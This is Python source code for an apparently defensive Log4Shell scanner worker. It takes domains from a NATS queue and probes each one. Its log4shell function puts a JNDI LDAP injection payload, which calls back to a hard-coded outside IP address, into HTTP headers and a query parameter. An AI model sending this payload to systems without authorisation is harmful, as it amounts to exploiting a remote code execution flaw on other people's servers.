import time
import functools
import json
from requests import get
import argparse, sys
import logging
import asyncio
import os
import signal
import traceback
import datetime as dt
from operator import itemgetter
from concurrent.futures import TimeoutError
from nats.aio.client import Client as NATS
from concurrent.futures import ProcessPoolExecutor

logging.basicConfig(stream=sys.stdout, level=logging.INFO)

NAME = os.getenv("NAME", "log4shell-scanner")
SUBSCRIBE_TO = os.getenv("SUBSCRIBE_TO")
PUBLISH_TO = os.getenv("PUBLISH_TO")
QUEUE_GROUP = os.getenv("QUEUE_GROUP")
SERVERLIST = os.getenv("NATS_SERVERS")
SERVERS = SERVERLIST.split(",")

def log4shell(domain):
    try:
        # payload = "${jndi:ldap://tracker.alpha.canada.ca:1389/c=" + domain + "}"
        payload = "${jndi:ldap://34.95.5.243:1389/c=" + domain + "}"
        params = {'id':payload}
        headers = {'User-Agent':payload, 'Referer':payload, 'X-Api-Version': payload}
        print(f'Testing https://{domain}')
        get(f"https://{domain}", headers=headers, params=params, verify=False, timeout=1)
        get(f"http://{domain}", headers=headers, params=params, verify=False, timeout=1)
    except Exception as e:
        print(e)
        pass


def to_json(msg):
    print(json.dumps(msg, indent=2))


async def run(loop):
    nc = NATS()

    async def error_cb(e):
        print("Error:", e)

    async def closed_cb():
        print("Connection to NATS is closed.")
        await asyncio.sleep(0.1)
        loop.stop()

    async def reconnected_cb():
        print(f"Connected to NATS at {nc.connected_url.netloc}...")

    async def subscribe_handler(msg):
        subject = msg.subject
        reply = msg.reply
        data = msg.data.decode()
        print(
            "Received a message on '{subject} {reply}': {data}".format(
                subject=subject, reply=reply, data=data
            )
        )
        payload = json.loads(msg.data)

        domain = payload["domain"]
        domain_key = payload["domain_key"]
        user_key = payload["user_key"]
        shared_id = payload["shared_id"]
        selectors = payload["selectors"]

        try:
            loop = asyncio.get_event_loop()

            with ProcessPoolExecutor() as executor:
                await loop.run_in_executor(executor, functools.partial(log4shell, domain))

        except TimeoutError:
            logging.error(
                f"Timeout while scanning {domain} (Aborted after {round(time.time()-start, 2)} seconds)"
            )
            await nc.publish(
                f"{PUBLISH_TO}.{domain_key}.log4shell",
                json.dumps(
                    {
                        "results": {
                            "log4shell": {"error": "missing"},
                        },
                        "scan_type": "log4shell",
                        "user_key": user_key,
                        "domain_key": domain_key,
                        "shared_id": shared_id,
                    }
                ).encode(),
            )

    try:
        await nc.connect(
            loop=loop,
            error_cb=error_cb,
            closed_cb=closed_cb,
            reconnected_cb=reconnected_cb,
            servers=SERVERS,
            name=NAME,
        )
    except Exception as e:
        print(f"Exception while connecting to Nats: {e}")

    print(f"Connected to NATS at {nc.connected_url.netloc}...")

    def signal_handler():
        if nc.is_closed:
            return
        print("Disconnecting...")
        loop.create_task(nc.close())

    for sig in ("SIGINT", "SIGTERM"):
        loop.add_signal_handler(getattr(signal, sig), signal_handler)

    await nc.subscribe(SUBSCRIBE_TO, QUEUE_GROUP, subscribe_handler)


if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(run(loop))
    try:
        loop.run_forever()
    finally:
        loop.close()
